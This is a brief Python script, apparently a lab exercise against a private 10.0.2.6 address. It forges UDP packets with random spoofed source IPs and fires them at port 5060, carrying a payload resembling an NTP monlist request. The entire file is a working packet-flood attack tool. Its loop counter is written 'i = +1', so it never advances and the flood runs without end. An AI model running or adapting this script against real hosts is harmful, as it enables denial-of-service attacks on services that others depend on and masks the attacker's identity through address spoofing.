import socket
from impacket import ImpactPacket
import randomIP

dip = "10.0.2.6"

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
r = randomIP.RandomIP()

ip = ImpactPacket.IP()

i = 0
while i < 100000:
    ip.set_ip_src(r.random_ip())
    ip.set_ip_dst(dip)
    udp = ImpactPacket.UDP()
    udp.set_uh_sport(10000)
    udp.set_uh_dport(5060)
    udp.contains(ImpactPacket.Data(
        str("\x17\x00\x03\x2a") + str("\x00") * 4
    ))
    ip.contains(udp)
    s.sendto(ip.get_packet(), (dip, 0))
    i = +1
